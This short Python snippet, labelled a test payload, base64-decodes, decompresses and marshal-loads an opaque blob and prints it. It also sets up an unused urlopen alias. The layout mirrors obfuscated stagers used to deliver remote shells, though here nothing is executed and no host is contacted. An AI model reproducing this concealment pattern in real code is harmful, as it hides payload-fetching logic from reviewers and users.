# decompressed payload for testing
import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
print(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWFgYCgtyskvSM3TUM8oKSmw0tc3NDbTMzQ00DMz0jMyMrEyNDa20NcvLklMTy0q1i8z9tArqFTX1CtKTUzR0AQASkkSFg=='))))